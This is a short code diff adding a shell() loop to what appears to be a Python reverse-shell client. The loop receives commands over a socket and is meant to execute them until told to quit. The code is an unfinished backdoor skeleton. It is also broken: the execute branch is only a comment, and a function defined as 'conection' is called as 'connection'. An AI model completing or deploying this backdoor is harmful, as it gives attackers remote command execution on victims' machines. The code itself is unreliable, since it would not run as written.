@@ -12,6 +12,16 @@ def conection ():
                except:
                 conection()
 
+
+def shell():
+        while True:
+                command = reliable_recv()
+                if command == 'quit' :
+                        break
+                else:
+                        #execute the command
+
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
       
